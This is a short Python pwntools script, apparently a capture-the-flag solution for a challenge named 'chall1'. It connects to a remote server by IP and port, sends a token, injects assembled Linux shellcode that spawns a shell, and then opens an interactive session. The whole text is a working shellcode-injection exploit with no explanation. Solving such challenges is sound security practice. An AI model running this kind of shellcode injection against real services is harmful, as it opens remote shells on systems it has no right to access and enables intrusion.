from pwn import *

context(arch='amd64', os='linux', log_level='DEBUG')

# p = process('./chall1')
p = remote('202.38.93.241', 10000)

p.recvuntil(':')
p.sendline('token') # token

p.send(asm(shellcraft.sh()))

p.interactive()